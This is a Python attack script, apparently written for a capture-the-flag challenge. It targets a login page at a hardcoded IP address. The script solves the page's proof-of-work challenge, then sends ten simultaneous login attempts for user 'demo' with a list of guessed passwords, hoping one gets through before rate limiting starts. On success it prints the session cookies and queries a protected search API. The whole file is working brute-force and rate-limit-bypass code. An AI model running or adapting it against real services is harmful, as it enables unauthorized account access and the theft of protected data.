#!/usr/bin/env python3
"""
Race condition and timing attacks
"""

import requests
from bs4 import BeautifulSoup
import hashlib
import threading
import time

BASE_URL = "http://138.199.163.92:16969"

def sha256hex(text):
    return hashlib.sha256(text.encode()).hexdigest()

def solve_pow(challenge):
    target = 2 ** (256 - 18)
    for nonce in range(300000):
        if int(sha256hex(challenge + str(nonce)), 16) < target:
            return nonce
    return None

print("="*60)
print("RACE CONDITION ATTACK")
print("="*60)

# Strategy: Send multiple login requests simultaneously
# Maybe one will slip through before rate limiting kicks in

challenge_resp = requests.get(f"{BASE_URL}/login")
soup = BeautifulSoup(challenge_resp.text, 'html.parser')
challenge = soup.find('input', {'name': 'pow_challenge'})['value']

print(f"[*] Challenge: {challenge}")
print(f"[*] Solving PoW...")
nonce = solve_pow(challenge)
print(f"[+] PoW solved: {nonce}")

# Try race condition with multiple simultaneous requests
print("\n[*] Trying race condition with simultaneous requests...")

results = []

def try_login_thread(username, password, thread_id):
    data = {
        'pow_challenge': challenge,
        'pow_nonce': str(nonce),
        'username': username,
        'password': password
    }
    
    session = requests.Session()
    resp = session.post(f"{BASE_URL}/login", data=data, allow_redirects=False)
    
    results.append((thread_id, username, password, resp.status_code, dict(resp.cookies)))
    
    if resp.status_code == 302:
        print(f"\n[!!!] Thread {thread_id} SUCCESS: {username}:{password}")
        print(f"      Redirect: {resp.headers.get('Location')}")
        print(f"      Cookies: {dict(resp.cookies)}")
        
        # Try to access protected resources
        search = session.get(f"{BASE_URL}/api/search")
        print(f"      API Search: {search.status_code}")
        if search.status_code == 200:
            print(f"      Content: {search.text}")

# Try multiple passwords simultaneously
passwords_to_try = [
    'demo', 'password', 'Password', 'demo123', 'Demo123',
    'quantum', 'vault', 'quantumvault', 'admin', 'secret'
]

threads = []
for i, pwd in enumerate(passwords_to_try):
    t = threading.Thread(target=try_login_thread, args=('demo', pwd, i))
    threads.append(t)

# Start all threads at once
print(f"[*] Starting {len(threads)} simultaneous login attempts...")
for t in threads:
    t.start()

# Wait for all to complete
for t in threads:
    t.join()

print(f"\n[*] Results:")
for thread_id, username, password, status, cookies in results:
    print(f"  Thread {thread_id}: {username}:{password} -> {status}")

print("\n[*] Race condition attack complete!")
